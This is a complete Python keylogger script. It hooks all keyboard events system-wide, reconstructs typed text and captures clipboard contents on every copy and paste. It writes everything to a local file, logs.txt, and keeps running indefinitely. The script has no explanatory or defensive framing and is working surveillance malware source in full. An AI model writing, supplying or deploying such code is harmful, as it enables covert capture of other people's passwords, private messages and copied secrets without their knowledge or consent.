import keyboard
import pyperclip

key_information = "logs.txt"
typed_chars = []

def write_to_file():
    with open(key_information, 'w', encoding='utf-8') as f:
        f.write(''.join(typed_chars))

def on_key_event(event):
    try:
        if event.event_type == 'down':
            name = event.name

            # Handle control + copy/paste
            if keyboard.is_pressed('ctrl') and name == 'c':
                content = pyperclip.paste()
                with open(key_information, 'a', encoding='utf-8') as f:
                    f.write(f"\n[Copied]\n{content}\n")

            elif keyboard.is_pressed('ctrl') and name == 'v':
                content = pyperclip.paste()
                typed_chars.append(content)
                with open(key_information, 'a', encoding='utf-8') as f:
                    f.write(f"\n[Pasted]\n{content}\n")
                write_to_file()

            elif name == 'backspace':
                if typed_chars:
                    typed_chars.pop()

            elif name == 'space':
                typed_chars.append(' ')
            elif name == 'enter':
                typed_chars.append('\n')
            elif len(name) == 1:
                typed_chars.append(name)

            write_to_file()

    except Exception as e:
        print(f"Error: {e}")

keyboard.hook(on_key_event)
keyboard.wait()  # Keep the script running
